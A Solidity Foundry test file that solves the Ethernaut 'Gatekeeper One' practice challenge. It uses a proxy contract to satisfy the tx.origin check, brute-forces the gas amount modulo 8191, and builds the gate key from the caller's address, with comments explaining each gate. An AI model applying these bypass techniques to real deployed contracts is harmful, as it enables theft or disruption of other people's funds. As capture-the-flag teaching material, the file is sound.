// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract Proxy {
  address internal challengeAddress;

  constructor(address _challengeAddress) {
    challengeAddress = _challengeAddress;
  }

  function enter(bytes8 _key) external returns (bool) {
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("enter(bytes8)", _key));
    return success;
  }
}

contract GatekeeperOneTest is Test {
  address internal factoryAddress;
  address internal challengeAddress;

  function setUp() public {
    // for this challenge, player needs to be tx.origin
    // let's skip the middleman just this time.
    factoryAddress = 0x9b261b23cE149422DE75907C6ac0C30cEc4e652A;
    (,bytes memory data) =
      factoryAddress.call(
        abi.encodeWithSignature("createInstance(address)", tx.origin));

    challengeAddress = abi.decode(data, (address));
  }

  function testExploit() public {
    // gateOne
    //   is passed through by using a proxy contract
    //
    // gateTwo
    //   just brute force it
    //   ee are running in a fork
    //
    // gateThree
    //   console.log() the operations on 0x1122334455667788
    //   use your fav REPL to get the hex conversions
    //
    //    uint32(uint64(_gateKey))   -> 0x1122334455667788 => 0x55667788
    //    uint16(uint64(_gateKey))   -> 0x1122334455667788 => 0x00007788
    //    uint64(_gateKey)           -> 0x1122334455667788 => 0x1122334455667788
    //    uint16(uint160(tx.origin)) -> 0x00a3...ea72 => ea72
    //
    //    gateThree part one can be true with 0x1122334400007788
    //    gateThree part two needs both to be different, which is true
    //    gateThree part three, make 7788 equal to the last hex digits of tx.origin
    //      ex: 0x1122334400007788 => 0x112233440000ea72
    //      in fact, it can be 0x100000000000ea72,
    //      which makes it straighforward to get analytically.

    bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);

    Proxy proxy = new Proxy(challengeAddress);

    for (uint i = 0; i < 8191; i++) {
      bool success = proxy.enter{gas: (8191 * 3) + i}(key);
      if (success) {
        (,bytes memory data) =
          factoryAddress.call(
            abi.encodeWithSignature("validateInstance(address,address)", challengeAddress, tx.origin));
        bool instanceValid = abi.decode(data, (bool));
        require(instanceValid);
        break;
      }
    }
  }
}
